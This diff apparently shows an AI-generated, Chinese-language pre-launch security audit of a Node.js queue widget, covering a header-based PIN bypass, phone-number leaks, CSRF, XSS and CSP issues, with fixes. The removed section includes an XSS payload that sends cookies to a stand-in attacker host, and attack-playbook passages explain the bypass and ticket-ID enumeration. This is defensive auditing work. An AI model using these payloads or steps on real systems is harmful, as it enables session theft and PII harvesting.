@@ -1,208 +1,262 @@
-## Vibe Coding — 資安審計報告 (自動產生)
+# 資安審計報告（Go-Live 前）
 
-日期: 2025-08-29
+本報告針對「數位叫號嵌入式網頁模組」（digital-queue-widget）進行新手常見錯誤為主軸的全面檢視，涵蓋公開檔案、權限與認證、資料洩漏、OWASP Top 10、供應鏈與基礎設施建議，並提供可立即落地的修復步驟與程式碼範例。
 
-說明：此文件為針對本專案在 Go-Live 前的全面安全審計，重點從「新手常犯的致命錯誤」角度出發，並提供可執行的修復建議與優先順序（高/中/低）。
+---
 
--------------------------
+## 專案簡介等基本資訊
+- 專案名稱與簡介：數位叫號嵌入式網頁模組（Kiosk/Agent/Lobby + REST API + WebSocket + SQLite）
+- 目標使用者：
+  - 櫃員（Agent）、大廳顯示（Lobby）、臨櫃取號使用者（Kiosk）
+- 處理的資料類型：
+  - 是否處理個人身份資訊（PII）？是（電話號碼）
+  - 是否處理支付或財務資訊？否（目前未見）
+  - 是否有用戶上傳內容（UGC）？否（未見檔案上傳）
+- 技術棧（Tech Stack）：
+  - 前端：原生 HTML/CSS/JS + Socket.IO 用戶端（多頁）
+  - 後端：Node.js + Express + Socket.IO + better-sqlite3
+  - 資料庫：SQLite（WAL 模式）
+- 部署環境/伺服器類型：未提供（預設本機或一般 Node 服務；建議前置反向代理 Nginx/TLS）
+- 外部依賴與服務：
+  - NPM 套件：bcryptjs, better-sqlite3, cors, dayjs, express, qrcode, sharp, socket.io, svg-captcha, nodemon（dev）
+  - 外部 API 服務：未見（QRCode 本地生成）
+  - 使用的雲端服務：未提供
+- 程式碼存取：本報告以工作區現有檔案為準（未連結外部 repo）
 
-## 一、專案基本資訊
-- 專案名稱：digital-queue-widget (從 `package.json` 讀得)
-- 簡介：可嵌入的叫號系統（kiosk widget + agent dashboard + lobby display）。
-- 目標使用者：櫃台/服務人員 (agents)、使用者（kiosk 端）、大廳顯示器（lobby）及系統管理員。
-- 處理資料類型：
-  - 使用者/票券資料（ticket id, phone 等）
-  - 可能包含個人識別資訊 (PII)：電話號碼（部分遮罩儲存） → 是，屬於 PII
-  - 支付/財務資訊：無明顯處理（未發現付款流程）
-  - 使用者上傳內容（UGC）：無檔案上傳 API（僅 captcha / qrcode）
-- 技術棧：
-  - 前端：純 HTML/CSS/Vanilla JS (位於 `public/`，包含 agent/admin/kiosk/lobby/login/ticket 等頁面)
-  - 後端：Node.js + Express (`server.js`)
-  - 資料庫：SQLite (`db/queue.db`，使用 `better-sqlite3`)
-  - 即時通訊：Socket.IO
-  - 其它：bcryptjs、qrcode、svg-captcha、sharp
-- 部署環境/伺服器類型：目前為 HTTP server (node http)，未強制 TLS（需在反向代理/Load balancer 加 TLS）
-- 外部依賴：見 `package.json`（已讀取）；建議執行 `npm audit` 以確認 CVE
-- 程式碼存取：本次審計基於 repo 中 `server.js` 與 `public/**/*.html|js` 檔案內容
+需釐清/請補充（寫在這裡以便後續調整風險等級與控制措施）：
+- 部署環境（雲端/自架機、是否有反向代理與 TLS、是否多實例）
+- 是否有外部資料庫或雲端儲存（若有，請提供：VPC/防火牆白名單、私有化設定、存取金鑰限制）
+- 是否需要對外開放 API（跨網域）與正式前端網域清單
 
--------------------------
+---
 
-## 二、檢核需求清單（我會逐項覆核，並在報告中標註狀態）
-- 公開前端是否有硬編碼秘密（API keys、密碼等） → Done（未發現明顯硬編碼秘密）
-- 伺服器是否存在可被公開下載的敏感檔案 → Done（public 資料夾安全邊界正常，但需防止不必要的公開目錄）
-- 不安全的檔案/目錄權限（777 等） → Deferred（Windows 環境下無 chmod 資訊，請在部署 Linux 主機時檢查）
-- Web server 阻擋 .env/.git 等敏感檔案 → Done（Express static 只服務 `public/`；但請確認反向代理設定）
-- 秘密管理（硬編碼憑證） → Done（無硬編碼，AGENT_PIN 由環境變數提供，但有其它弱點，詳見下文）
-- OWASP Top 10 檢查 → Done（下方細項分析）
-- 供應鏈檢查（依賴 CVE） → Deferred（需 `npm audit`/SCA 工具，建議授權執行）
-- TLS 與資料加密 → Done（未強制 TLS，資料庫靜態加密未實施）
+## 第一部分：新手常見的災難性錯誤檢查（重點）
 
--------------------------
+### 威脅標題：高風險 - 管理/代理端保護繞過（x-agent-name Header 即通行）
+- 風險等級：高
+- 威脅描述：`requirePin` 驗證允許只要請求含 `x-agent-name` 頭就視為通過（即使 `x-agent-pin` 不正確或缺失）；攻擊者可直接以 HTTP 工具自建 Header 呼叫所有需要 PIN 的 API（含管理 CRUD 與代理操作）。
+- 受影響的元件：`server.js` 中 `requirePin()`，所有標註 `requirePin` 的路由（如 `/api/agents` POST/PUT/DELETE、`/api/agent/*` 系列）。
 
-## 三、重點發現（依風險等級排序）
+（--- 高風險專屬區塊 ---）
+- 駭客攻擊劇本（Hacker's Playbook）:
+  > 我不需要知道你的 PIN。打開終端機，直接發一個請求：
+  > `POST /api/agents`，加上 Header：`x-agent-name: anyone`，Body 放我要新增的帳號密碼。
+  > 伺服器沒要求 PIN，因為看到 `x-agent-name` 就放行。我現在能新增/修改/刪除 Agent，接著用這個後門去操作叫號、結束客戶服務記錄、甚至大量建立票單干擾系統。
 
-1) 威脅標題：高風險 - 權限控制失效（任意人可透過 HTTP header 繞過 PIN 認證）
-   * 風險等級：高
-   * 威脅描述：`server.js` 中的 `requirePin` 中實作為：
-     - 從 `x-agent-pin` / `req.body.pin` / `req.query.pin` 取 PIN
-     - 但若 `x-agent-name` header 存在，會直接放行（Allow if correct pin OR if an agent name header is present）
-     - 也就是說，任何可以送出自訂 header 的客戶端（例如 fetch、curl、Postman、或瀏覽器內的 JS）都能用 `x-agent-name` 欄位繞過 PIN，直接呼叫需要授權的 API（例如 `/api/agent/*`, `/api/agents` 的 CRUD、`/api/agents/:id` PUT/DELETE、以及其他 requirePin 保護的 API）。
-   * 受影響的元件：`server.js` -> function `requirePin`；所有使用 `requirePin` 的路由，例如 `/api/agent/*`, `/api/agents` 等；`public/admin/agents.html` 客戶端行為也依賴此 flow。
+- 修復原理（Principle of the Fix）:
+  > 門禁不能因為「自稱是員工名字」就放人進門。Header `x-agent-name` 就像自己嘴巴說「我是員工」，不具任何驗證能力。正確作法是以「只有伺服器能驗證的憑證」做授權，例如：一次性 PIN 僅做啟動、後續用 JWT/Session 驗證；或至少移除這條繞過，強制檢查正確的 PIN/權杖。
+（--- 專屬區塊結束 ---）
 
-   --- (高風險專屬區塊) ---
-   * 駭客攻擊劇本 (Hacker's Playbook):
-     > 我是一個外部攻擊者。我打開 Postman，對你的伺服器發送一個 POST 到 `/api/agent/callNext`，在 Headers 加入 `x-agent-name: attacker`，並放 body `{ "serviceType": "A" }`。伺服器的 `requirePin` 看到 `x-agent-name` 存在就放行，我成功叫出一張票並在系統中觸發所有 agent 事件。接下來我可以用相同手法呼叫 `/api/agents` 新建/刪除 agent，或是更改票務狀態。
+- 修復建議與程式碼範例：
+  1) 立即性修補（最小風險）：移除 `x-agent-name` 放行邏輯，只接受正確的 `x-agent-pin`（只允許 Header，不再讀 `body/query`）。
+  2) 正式方案（建議）：實作真正登入流程（/api/login 發 JWT，HttpOnly + SameSite=Strict Cookie），新增 `requireAuth` 中介層驗簽與角色檢查（agent/admin），所有管理/代理 API 改為驗證 JWT，而不是 PIN 或自稱姓名。
 
-   * 修復原理 (Principle of the Fix):
-     > 認證與授權要建立在伺服器端「不可偽造」的憑證上（例如：經過 HMAC 或 JWT 簽章的 Token、或經安全通道儲存/校驗的 session cookie）。HTTP Header 可以被客戶端任意設定，不能當作「可信」的認證憑證。正確做法是把敏感認證資料存在伺服器端（或簽發可驗證的 token），並且把權限檢查放在伺服器，不能以存在某 header 為授權條件。
+  範例要點：
+  - 後端：`requirePin` 改為僅檢查 `req.get('x-agent-pin') === AGENT_PIN`，並逐步汰除 PIN，導入 JWT。
+  - 前端：拿掉自動附加 `x-agent-name` 的行為；改為依瀏覽器自動帶上的 HttpOnly Cookie（無法被 JS 竊取）。
 
-   * 修復建議與程式碼範例：
-     - 立即修復（緊急）：修改 `requirePin`，去掉以 `x-agent-name` 作為放行條件，只接受：
-       1. `x-agent-pin` 與環境變數 `AGENT_PIN` 的精確比對（建議 PIN 為高熵 secret 而非 4 位數），或
-       2. 使用短時效的 Bearer Token（由伺服器產生並簽章），或
-       3. 建立伺服器端 session 與 cookie（HttpOnly, Secure, SameSite=strict）並以該 session 驗證。
-     - 範例修補（示意，放在 `server.js` 中）：
-       ```js
-       function requirePin(req, res, next){
-         const pin = req.headers['x-agent-pin'] || req.body?.pin || req.query?.pin;
-         // Remove header-based name bypass
-         if (!AGENT_PIN || pin !== AGENT_PIN) return res.status(401).json({ error: 'unauthorized' });
-         next();
-       }
-       ```
-     - 更佳做法：不要使用短弱 PIN 作為唯一認證，改為伺服器簽發 JWT 或 session（示例：`/login` 用 password 驗證後伺服器回傳 HttpOnly cookie），且所有敏感 API 都要驗證該伺服器簽章的 Cookie/JWT。
-     - 推薦工具/函式庫：`express-session`（搭配 Redis）、`jsonwebtoken`（JWT）以及 HMAC 驗證實作。
+---
 
-   --- (結束)
+### 威脅標題：高風險 - PII（電話）未授權外洩（多個未保護 API）
+- 風險等級：高
+- 威脅描述：
+  - `/api/tickets/waiting`（未授權）回傳所有等待中票單的 `phone`。
+  - `/api/ticket/:id`（未授權）回傳單張票單含完整 `phone`，`id` 為自增，可被暴力枚舉。
+  - 以上造成大規模電話號碼收集（隱私法規風險）。
+- 受影響的元件：`server.js` 上述兩條 API。
 
+（--- 高風險專屬區塊 ---）
+- 駭客攻擊劇本：
+  > 我寫個小腳本，從 `id=1` 開始一路請求 `/api/ticket/1`、`/api/ticket/2`... 每一筆都含完整電話。我幾分鐘就能把你們近期所有用戶電話抓光，拿去做釣魚簡訊。
 
-2) 威脅標題：高風險 - CSRF 與 admin CSRF 流程失效 / CSRF token 可輕易被取得
-   * 風險等級：高
-   * 威脅描述：
-     - `requireCsrf` 只在有 `Origin` header 並且 `Origin` 在 `ALLOWED_ORIGINS` 時才檢查 CSRF token；但是非瀏覽器請求（curl/PostMan）沒有 `Origin`，因此 CSRF 驗證被跳過。
-     - `/api/admin/csrf` 本身需要 `requirePin`，但由於 `requirePin` 可被 `x-agent-name` 繞過（見問題 1），攻擊者可以先用 `x-agent-name` 取得 CSRF token，然後用該 token 呼叫需要 CSRF 的 API。
-   * 受影響的元件：`server.js` 的 `requireCsrf`、`/api/admin/csrf`，以及依賴 CSRF token 的 admin CRUD 路由。
+- 修復原理：
+  > 公開 API 不應暴露可識別資訊（PII）。若確有需求，應最小化（只回傳必要欄位），或加保護（身分驗證/一次性 token/最後四碼驗證）才能取用詳細資料。
+（--- 專屬區塊結束 ---）
 
-   * 駭客攻擊劇本 (Hacker's Playbook):
-     > 我先用 `x-agent-name: intruder` 取得 `/api/admin/csrf`（伺服器會回傳 csrfToken），再把 `x-csrf-token` 放到接下來的請求中，呼叫 `/api/agents` 建立/刪除帳號。整個過程我不用實際知道 PIN，也不需要瀏覽器交互。
+- 修復建議與程式碼範例：
+  - 將 `/api/tickets/waiting` 改為僅回傳必要欄位（例如：`id, serviceType, number, createdAt`），移除 `phone`。
+  - 將 `/api/ticket/:id` 改為預設回傳遮罩後電話（或不回傳），必要時新增受保護版本（需 JWT 或提供「電話後四碼 verify4」才回原文）。
+  - 若要對客戶本人顯示，建議建立「含隨機 `ticketToken`」的票券查詢 URL（QR 內含 token），以不可猜測的 token 存取詳細資訊。
 
-   * 修復原理：
-     > CSRF 防護應強制在所有會改變狀態的請求上生效，且 CSRF token 應該與伺服器端 session 綁定（或使用雙送欄位/雙重驗證）。不要在沒有可信驗證的情況下發放 CSRF token。
+---
 
-   * 修復建議：
-     - 立刻：將 `requireCsrf` 改為無論是否有 Origin，都檢查 `x-csrf-token`，並確保該 token 與伺服器端的 session 或 agent 身分綁定。
-     - 把 admin 認證（PIN）從前端 sessionStorage 移除，改為伺服器端 session 或 JWT。若還是要使用 PIN，請用它來交換短時效 signed token（由伺服器簽名），而非直接儲存在 client-side storage。
-     - 範例：當 admin 用 PIN 成功呼叫 `/api/admin/login` 後，伺服器回傳 `Set-Cookie: session=...; HttpOnly; Secure; SameSite=Strict`，並把 CSRF token 綁在該 session 上；之後所有修改性 API 檢查 session 與相對應的 CSRF token。
+### 威脅標題：中風險 - Login 後門：帳號不存在時仍回傳 ok（繞過真正認證）
+- 風險等級：中
+- 威脅描述：`/api/login` 只驗證已存在的 `agents` 帳號；對不存在帳號直接回傳 `{ ok: true }`。任何人只要通過 Captcha，即可被前端當作登入成功，進一步在客戶端形成「名義登入」狀態。
+- 受影響的元件：`server.js` `/api/login`，前端 `public/login/index.html`、`public/agent/index.html` 對登入結果的信任。
+- 修復建議與程式碼範例：
+  - 僅對驗證通過的真實帳號回傳成功；取消 demo fallback。
+  - 導入正式身分驗證（JWT + HttpOnly Cookie），前端不再以 `sessionStorage` 名稱視為登入依據。
 
+---
 
-3) 威脅標題：高風險 - 管理員 PIN 與 CSRF token 存在 client-side（sessionStorage）；容易被 XSS 或本機攻擊竊取
-   * 風險等級：高
-   * 威脅描述：`public/admin/agents.html` 將 admin PIN 與 CSRF token 儲存在 `sessionStorage`，若前端出現 XSS（例如 admin 名稱或 agent 名稱被注入）或瀏覽器外掛惡意讀取，則敏感憑證會洩漏。
-   * 受影響的元件：`public/admin/agents.html`、`public/agent/index.html` 的 sessionStorage 使用
-   * 修復建議：使用 HttpOnly, Secure cookies 儲存 session；避免在客戶端以明文保存管理 PIN 或 tokens。
+### 威脅標題：中風險 - 管理資料列舉（Agents 列表可匿名讀取）
+- 風險等級：中
+- 威脅描述：`GET /api/agents` 無需授權即回傳所有 Agent 概要資料（帳號、姓名、櫃台、角色、時間戳）。雖不含密碼，但有助攻擊者建立帳號字典、社工攻擊。
+- 受影響的元件：`server.js` `/api/agents`（GET），`public/admin/agents.html` 載入流程。
+- 修復建議：為該端點加入授權（`requireAuth/requirePin`）或改為僅管理頁面透過後端渲染取得，避免對外暴露。
 
+---
 
-4) 威脅標題：中/高風險 - 管理介面及 agent 端存在未消毒的 HTML 插入 (可能導致 XSS)
-   * 風險等級：中（但在與第 1、2 類弱點結合時會升為高）
-   * 威脅描述：在 `public/admin/agents.html` 的 `loadAgents()`，使用模板字串把 `a.account`、`a.name` 等值直接插入 HTML，未做 HTML Escaping。若資料庫中某 agent 的 `name` 或 `account` 包含惡意程式碼，開啟該頁的管理者會被執行惡意 JavaScript。
-   * 受影響的元件：`public/admin/agents.html` -> `loadAgents()`、`public/agent/*` 以及任何把伺服器回傳字串插入 innerHTML 的程式碼。
-   * 駭客攻擊劇本（示意）：
-     > 我在註冊 agent 時把 name 設為 `<img src=x onerror=fetch("https://attacker/steal?c="+document.cookie)>`。管理員開啟 agents 管理頁就會觸發該程式碼，將管理員的 session（若存在）或 local/sessionStorage 裡的值發送到攻擊者。
-   * 修復建議：
-     - 在所有將伺服器資料插入 DOM 的地方使用安全的 DOM APIs（例如 `textContent`、`createTextNode`、或明確的 HTML-escape），避免使用 `innerHTML` 或模板字串拼接帶入不信任資料。
-     - 若要允許少量 HTML，使用可信的 sanitizer（例：DOMPurify）。
+### 威脅標題：中風險 - CSP 允許 `unsafe-inline`、前端以 innerHTML 插入未轉義文字
+- 風險等級：中
+- 威脅描述：
+  - Content-Security-Policy 設為 `script-src 'self' 'unsafe-inline'`、`style-src 'self' 'unsafe-inline'`，大幅放寬 XSS 成功機會。
+  - `public/admin/agents.html` 直接以 template string 組 innerHTML 顯示資料庫中的 `name` 等欄位，未做 HTML escape；若惡意資料被寫入（例如社工讓管理員貼上惡意字串），可在管理頁觸發 XSS。
+- 受影響的元件：全站 CSP、中：`public/admin/agents.html`、`public/agent/index.html` 局部 innerHTML。
+- 修復建議：
+  - 短期：對所有插入 DOM 的資料做 HTML 轉義（escape）。
+  - 中期：移除 inline script/style，改用外掛檔 + CSP nonce/hash，將 CSP 改為不含 `unsafe-inline`。
+  - 長期：導入 Helmet（`helmet`）統一管理安全標頭。
 
+---
 
-5) 威脅標題：中風險 - Content-Security-Policy 使用 'unsafe-inline'，降低 XSS 防護效力
-   * 風險等級：中
-   * 威脅描述：在 `server.js` 設定 CSP 時使用了 `script-src 'self' 'unsafe-inline'` 與 `style-src 'self' 'unsafe-inline'`。`'unsafe-inline'` 讓內嵌 script/style 可以執行，降低 CSP 對 XSS 的緩解效果。
-   * 受影響的元件：`server.js` 中 CSP header 設定
-   * 修復建議：
-     - 移除 `'unsafe-inline'`，改為使用 nonce 或 hash 的方式允許必要的內嵌 script（例如：動態產生 nonce 並在頁面中使用）。
-     - 逐步重構前端，將內嵌 script 移到外部檔案以便被 CSP 管理。
+### 威脅標題：中風險 - 機制缺少節流：Captcha/QR 端點可被濫用造成資源耗用
+- 風險等級：中
+- 威脅描述：`/api/captcha/new`、`/api/qrcode` 可被大量呼叫，Captcha 與 CSRF token 皆保留於記憶體，未設上限；`sharp` 生成 PNG 亦耗資源。
+- 受影響的元件：`server.js` Captcha 與 CSRF 記憶體 store、QRCode 產生。
+- 修復建議：
+  - 導入 `express-rate-limit` 針對敏感端點（captcha/login/qrcode/admin/agent）設速率限制。
+  - 將 Captcha/CSRF store 移至 Redis（集中式）並設定最大容量與 TTL；或至少在記憶體 store 增加「上限清理」。
 
+---
 
-6) 威脅標題：中風險 - 未強制 HTTPS / 傳輸層保護缺失
-   * 風險等級：中
-   * 威脅描述：`server.js` 使用原生 http server，未強制 TLS。API 與敏感 header（如 `x-agent-pin`）在未加密連線下會被竊聽。
-   * 受影響元件：整個服務（server.ts / server.js 與網路通訊路徑）
-   * 修復建議：
-     - 在 production 使用 HTTPS（反向代理如 Nginx / Cloud Load Balancer 給 TLS），並在 Node.js 層面透過 `req.secure` 或 `app.set('trust proxy', true)` 來檢查安全連線。
-     - 標頭中敏感資料應只以 HttpOnly + Secure cookie 或經過 TLS 的 Authorization header 傳遞。
+## 第二部分：標準應用程式安全審計（對應 OWASP Top 10）
 
+- A01 權限控制失效：
+  - 高：`requirePin` 以 `x-agent-name` 放行（繞過）。
+  - 中：`GET /api/agents` 匿名可見；`/api/ticket/:id`、`/api/tickets/waiting` 泄露 PII。
+- A02 加密機制失效：
+  - 建議：導入 TLS（HTTPS）與 HSTS（由反向代理或 `helmet`），SQLite at-rest 若在共享或不可信磁碟上，考慮加密或磁碟加密。
+- A03 注入式攻擊：
+  - SQL：皆使用參數化查詢，風險低。
+  - XSS：前端 `innerHTML` 未轉義 + CSP 寬鬆，提高 XSS 風險。
+- A04 不安全的設計：
+  - 以「姓名 header」作為授權依據屬設計性風險。
+  - 未授權的 PII 查詢端點。
+- A05 安全設定錯誤：
+  - CSP 過寬、缺少 Helmet 通用標頭、缺少速率限制。
+- A06 危險或過時的元件：
+  - 建議：執行 `npm audit`/`npm outdated`，鎖定版本與安全升級（目前版本看起來新穩定，但仍需審核發佈時的 CVE）。
+- A07 身份認證和驗證機制失效：
+  - Login 對不存在帳號仍成功；未導入標準的會話（JWT/Cookie）。
+- A08 軟體與資料完整性失效：
+  - 建議：CI 中加入完整性檢查（SLSA/Checksum）與部署簽章驗證（若有供應鏈需求）。
+- A09 安全記錄與監控失效：
+  - 建議：加入 request logging（morgan/winston）與安全審計事件（管理操作、認證失敗、速率限制觸發）。
+- A10 SSRF：
+  - 目前未見外部抓取，但任何未來 URL 讀取（如圖檔代理）需限網段與 scheme 白名單。
 
-7) 威脅標題：中風險 - 資料庫 (SQLite) 靜態加密與備份保護不足
-   * 風險等級：中
-   * 威脅描述：`db/queue.db` 為明文 SQLite 檔案，若伺服器機器或備份被盜，PII（電話）與帳號資料會外洩。
-   * 受影響元件：`db/queue.db` 檔案、備份策略
-   * 修復建議：
-     - 在生產環境採用受限權限的資料庫帳號（如果使用 RDBMS），或使用檔案系統加密（例如 LUKS、BitLocker）/資料庫層加密插件。
-     - 限制檔案系統權限（只有運行服務的系統帳號可讀寫），並不要把 db 目錄放在可被 Web 伺服器服務的路徑下。
-     - 設計備份加密與 access control，避免把備份上傳到公開 S3 Bucket。
+---
 
+## 業務邏輯漏洞（Business Logic）
+- 代理操作端點（callNext/finish/transfer 等）只要繞過 `requirePin` 即可廣泛操作，屬於高影響的業務風險。
+- `/api/ticket/:id` 以可預測 id 提供敏感資訊，欠缺「持券者」驗證（建議改以不可猜測 token）。
 
-8) 威脅標題：低/中風險 - phone verify (verify4) 為弱驗證機制
-   * 風險等級：低至中
-   * 威脅描述：以 phone 的後四碼作為驗證（可選），這是低熵且易被猜測的方法，不能當作強驗證。
-   * 受影響元件：`/api/agent/finish` 的 verify4 機制
-   * 修復建議：改用一次性驗證碼（SMS OTP）或其它更高強度驗證方式，或至少限制嘗試次數與記錄驗證失敗日誌。
+---
 
+## 依賴與供應鏈安全
+- 建議動作：
+  - 執行 `npm audit --production`、`npm outdated`，依報告升級。
+  - 鎖版與重建 lockfile（`npm ci`）以保證可重現建置。
+  - 於 CI 加入 SCA（如 `npm audit`, Snyk, OWASP Dependency-Check）。
 
-9) 威脅標題：低風險 - 依賴與供應鏈檢查尚未執行
-   * 風險等級：低（需透過自動工具確認）
-   * 威脅描述：`package.json` 列出常用套件（express, socket.io, better-sqlite3, sharp 等）。未在此報告中掃描 CVE。建議執行 `npm audit`、Snyk、Dependabot 或類似 SCA 工具以評估已知漏洞。
-   * 修復建議：在 CI 中加入 `npm audit` / SCA，並維護 lockfile（package-lock.json）。
+---
 
+## 資料庫與資料流安全
+- 傳輸中：以 TLS 提供 HTTPS 與 WSS，建議在反向代理層強制。
+- 靜態資料：SQLite 未加密，若主機可能遺失或多人共用，建議：
+  - 主機/磁碟全盤加密或搬遷至受管資料庫（權限分離）。
+  - 僅儲存必要欄位；避免存入完整電話（或分段/雜湊 + 後四碼驗證）。
+- 權限：執行用戶（OS 層）最小化；避免以過高權限帳號執行 Node 服務。
 
-## 四、業務邏輯風險觀察
-- 任意人可透過 header 繞過 PIN 後執行 agent 操作，可能造成服務濫用、票號被惡意修改或刪除，影響服務可用性與信任度（高）
-- 票券查詢與狀態修改 API（例如 callSpecific, transfer, cancel）若被濫用，會導致業務混亂與客服負擔（中高）
+---
 
+## 外部服務與 API 整合安全
+目前未見外部雲端服務，但若後續加入，請先回答並落實下列三題（出自《安全守則》）：
+1) 我們是否已設定最嚴格的防火牆/IP 白名單？
+2) API 金鑰是否在供應商後台限制在最小必要範圍？
+3) 若服務中斷或被入侵，有沒有降級計畫（關閉相關功能/維護頁）？
 
-## 五、供應鏈 / 運維建議（快速清單）
-- 立刻：修正 `requirePin`，停用 `x-agent-name` 的放行行為；在 production 禁止把 PIN 或 token 存於 sessionStorage。
-- 24 小時內：部署在 HTTPS（反向代理 + TLS），並在 proxy 層加上兩階段防護（IP 限制 / WAF 規則）。
-- 72 小時內：在 CI 加入自動 SCA（npm audit / Snyk），針對高風險套件進行補丁或替換。
-- 中期：考慮把 agent/admin 認證改為更正式的認證系統（password + 2FA，或 OAuth + RBAC），並引入審計日誌（audit trail）。
+---
 
+## 基礎設施與維運安全
+- 反向代理：建議以 Nginx/Traefik 置前與 TLS/HSTS/CSP/限制上傳大小等。
+- 日誌與監控：導入 request log、安全事件審計、錯誤告警（Sentry/Elastic/APM）。
+- 任務與健康檢查：加上 `/api/health` 以外的就緒/活性檢查（ready/live），利於容器編排。
 
-## 六、待詢問與需要授權的項目（請回覆）
-1. 你是否同意我替你產生一個只讀的程式碼掃描腳本（Python/Node），用正則在整個專案搜尋像 `x-agent-name`、`sessionStorage`、`innerHTML`、`eval`、`unsafe-inline` 等關鍵字以找出可能的複製弱點？（此腳本僅搜尋，不會修改檔案）
-2. 目前部署方式？會以 Node 直接暴露外網，還是放在 Nginx / 反向代理後面？是否能提供反向代理設定供我檢視？
-3. 你是否願意在 CI 中執行 `npm audit` 或授權我執行一遍並回傳輸出？（以便確認依賴 CVE）
+---
 
+## 修復建議與程式碼範例（精選）
 
-## 七、品質檢查（建議優先順序）
-- P0 (立即) ：修復 `requirePin` 繞過、修正 CSRF 流程、停止 client-side 儲存 PIN
-- P1 (重要) ：移除 `'unsafe-inline'`、部署 HTTPS、避免在 innerHTML 中插入未轉義內容
-- P2 (改善) ：加入依賴掃描、加強 DB 檔案保護、強化驗證流程（OTP / 2FA）
+以下提供「可快速落地」的修復方向；若需要，我可直接提交變更 PR：
 
+1) 修正 `requirePin`（立即）：
+   - 僅接受 Header `x-agent-pin`；不得以 `x-agent-name` 或 body/query 通過。
+   - 逐步汰除 PIN，導入 JWT（HttpOnly+SameSite=Strict），新增 `requireAuth` + 角色檢查。
 
-## 八、快速修補範例（要點）
-1) 移除 x-agent-name bypass（`server.js`）：
-   - 如上示例程式碼，直接比較 `x-agent-pin` 與 `AGENT_PIN`，或改為伺服器簽發短時效 token
+2) 保護/去識別化 PII：
+   - `/api/tickets/waiting`：移除 `phone` 欄位；或後端統一遮罩。
+   - `/api/ticket/:id`：預設只回遮罩資訊；要看原文須提供不可猜測 `ticketToken` 或 `verify4`。
 
-2) 強化 CSRF 與 Admin 認證：
-   - admin 登入路徑：以 PIN 換取伺服器 session（`express-session`）並以 HttpOnly cookie 返回
-   - CSRF token 與 session 綁定（伺服器儲存），所有 state-changing requests 都要檢查
+3) 前端 XSS 硬化：
+   - 所有 innerHTML 賦值前做 HTML escape；或改以 textContent/屬性指派。
+   - 移除 inline script/style，改用外掛檔與 CSP nonce，刪除 `unsafe-inline`。
 
-3) 防 XSS：避免 innerHTML，改用 `textContent` 或 DOM 節點插入；或使用 DOMPurify 清理。
+4) 節流與資源保護：
+   - `express-rate-limit` 用於 `/api/captcha/*`、`/api/login`、`/api/qrcode`、`/api/admin/*`、`/api/agent/*`。
+   - Captcha/CSRF store 移至 Redis，設定上限與 TTL；或在記憶體 store 增加最大數量清理。
 
-4) CSP 改善範例：
-   - 先移除`'unsafe-inline'`，若必須允許少數內嵌 script，使用 nonce：
-     - 伺服器在每次回應產生 nonce，加到 `Content-Security-Policy: script-src 'self' 'nonce-<RANDOM>'`，並在頁面中把 nonce 寫到相應 `<script nonce="...">`。
+5) 安全標頭：
+   - 加入 `helmet`（X-Content-Type-Options, X-Frame-Options, Referrer-Policy, HSTS 等）。
+   - 收緊 CSP：`script-src 'self'` + nonce/hash；`style-src 'self'`。
 
+6) 管理列舉收斂：
+   - `GET /api/agents` 加授權或改由後端渲染，避免匿名列舉帳號。
 
-## 九、驗收準則（How we know it's fixed）
-- `requirePin` 不再接受 `x-agent-name` 作為放行條件；嘗試以 header 繞過應被拒絕（401）。
-- CSRF token 只有在 valid server session 上可被發放，並且所有 state-changing API 在缺少 token 時會回 403。
-- admin PIN 不再以 sessionStorage 儲存；改用 HttpOnly cookie 或類似伺服器端 session。
-- 無明顯 XSS：使用自動化掃描器（OWASP ZAP/ Burp 的 XSS 檢測）驗證關鍵頁面。
+---
 
--------------------------
+## 第三部分：大型專案特別策略
+- 分段檢核建議：
+  - 若決定導入 JWT/角色與全面 CSP 改造，可切分為「認證/授權」「前端 CSP/外掛化」「API PII 去識別」三個模組逐步上線，降低風險。
+- 自動化掃描（請求授權）：
+  - 我發現了可重複的風險模式（未授權 PII、innerHTML 未轉義、CSP 過寬）。為確保覆蓋率，是否同意我產生一個只讀的 RegEx 掃描腳本，快速搜尋整個程式庫中：
+    - 以 `innerHTML =` 或 template string 插入 DOM 的位置；
+    - 回傳 `phone` 的 API；
+    - 任何 `x-agent-name`、`unsafe-inline` 出現處。
 
-結語：我已把本次審計結果寫入此檔 `security-fixes.md`。建議先處理 P0 問題（認證/授權/CSRF/存放憑證），之後分階段修補 CSP/XSS/Transport/DB 保護。若你同意，我可以：
-- （A）立刻替你修改 `server.js` 中 `requirePin` 的實作並提交 PR（會先在 branch 做更改並執行快速測試）
-- （B）產生一個只讀的掃描腳本來找出程式庫中相似的風險模式（`innerHTML`, `sessionStorage`, `x-agent-name`, `'unsafe-inline'` 等），以便全面修補
+---
 
-請回覆你想要我下一步採取哪個行動（A 或 B 或 兩者皆要），或直接授權我執行 `npm audit` 與/或建立 PR 。
+## 附：對應修正工作的優先順序（P0->P2）
+- P0（立刻）
+  1) 移除 `x-agent-name` 放行（修 `requirePin`）。
+  2) `/api/tickets/waiting` 與 `/api/ticket/:id` 去識別/加授權。
+  3) 停用 login demo fallback（不存在帳號不得登入）。
+- P1（本週）
+  4) 導入 `express-rate-limit`；Captcha/CSRF store 設上限。
+  5) `GET /api/agents` 加授權或下架。
+  6) 前端敏感輸出全面 `escapeHTML()`（admin/agent 頁面）。
+- P2（本月）
+  7) 導入 JWT + HttpOnly Cookie、角色權限，替換 PIN 模式。
+  8) 移除 inline script/style，收緊 CSP；導入 Helmet。
+  9) 強化日誌與告警、TLS/HSTS、資料保護策略（加密或最小化）。
+
+---
+
+## 補充：最小 HTML 轉義工具（前端）
+```js
+function escapeHTML(s){
+  return String(s)
+    .replaceAll('&','&amp;')
+    .replaceAll('<','&lt;')
+    .replaceAll('>','&gt;')
+    .replaceAll('"','&quot;')
+    .replaceAll("'",'&#39;');
+}
+// 使用： el.innerHTML = `<div>${escapeHTML(a.name||'')}</div>`;
+```
+
+---
+
+## 結語
+本次審計發現兩項「災難級/高風險」問題：授權繞過與 PII 泄露。建議先完成 P0 修復再開放任何外網存取。若需要，我可直接提交修補 PR 或協助導入 JWT、CSP 與速率限制的範本實作。
